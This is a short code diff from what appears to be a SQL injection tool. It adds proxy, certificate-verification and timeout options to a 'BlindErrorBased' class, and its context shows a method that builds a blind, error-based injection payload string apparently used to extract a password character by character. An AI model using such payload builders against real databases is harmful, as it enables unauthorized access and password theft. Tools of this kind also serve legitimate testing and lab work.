@@ -3,9 +3,9 @@ from .dbConfig import DB_CONFIG
 
 class BlindErrorBased(BaseSQLi):
     found_password = ""
-    def __init__(self, url, inject_point, targetTable, db_type="oracle", extra_cookies=None):
-        super().__init__(url, targetTable, db_type, inject_point, extra_cookies)
-        self.found_password = "" 
+    def __init__(self, url, inject_point, targetTable, db_type="oracle", extra_cookies=None, proxy=None, verify=True, timeout=30):
+        super().__init__(url, targetTable, db_type, inject_point, extra_cookies, proxy, verify, timeout)
+        self.found_password = ""
 
     def build_condition_payload(self, condition):
         return f"'||(SELECT CASE WHEN ({condition}) THEN {DB_CONFIG[self.db_type]['error_trigger']} ELSE '' END{DB_CONFIG[self.db_type]['from_dual']})||'"
